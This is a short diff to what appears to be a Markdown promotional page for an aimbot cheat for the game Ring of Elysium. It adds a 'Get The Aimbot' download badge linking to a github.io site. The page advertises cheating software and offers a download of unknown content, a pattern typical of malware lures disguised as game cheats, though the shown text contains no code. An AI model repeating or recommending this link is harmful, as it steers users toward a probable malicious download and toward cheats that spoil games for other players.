@@ -6,6 +6,8 @@ If you’ve ever been lasered across the snowy hills of Ring of Elysium and wond
 
 In this write-up, we’ll dive deep into **ROE aimbot hacks**, explain how they work, what features they bring, and why so many players rely on them for smooth wins.
 
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://ring-of-elysium-aimbot.github.io/.github/)
+
 ---
 
 ## Product Description
